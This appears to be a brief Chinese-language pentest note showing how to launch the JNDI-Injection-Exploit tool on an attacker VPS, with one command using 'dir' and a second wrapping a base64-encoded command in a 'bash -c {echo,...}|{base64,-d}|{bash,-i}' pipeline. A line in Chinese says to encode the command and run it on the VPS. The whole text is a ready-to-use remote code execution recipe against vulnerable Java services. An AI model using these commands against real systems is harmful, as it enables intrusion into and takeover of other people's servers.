java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "dir" -A vps_ip

编码后在VPS执行即可

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,ZGly}|{base64,-d}|{bash,-i}" -A vps_ip